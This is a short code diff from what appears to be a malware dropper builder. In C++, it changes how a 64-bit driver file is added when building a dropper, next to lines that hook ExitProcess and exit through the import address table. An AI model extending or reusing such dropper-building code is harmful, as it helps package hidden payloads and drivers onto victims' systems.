@@ -347,7 +347,7 @@ bool DropperObject::build( bf::path core, bf::path core64, bf::path config, bf::
 			_addDriverFile(driver.string(), driver.filename());
 
 		if (!driver64.empty())
-			_addDriverFile(driver64.string(), driver64.filename());
+			_addDriver64File(driver64.string(), driver64.filename());
 		
 		_hookedCalls["ExitProcess"] = _getIATCallIndex(std::string("kernel32.dll"), std::string("ExitProcess"));	
 		_hookedCalls["exit"] = _getIATCallIndex(std::string("msvcrt.dll"), std::string("exit"));
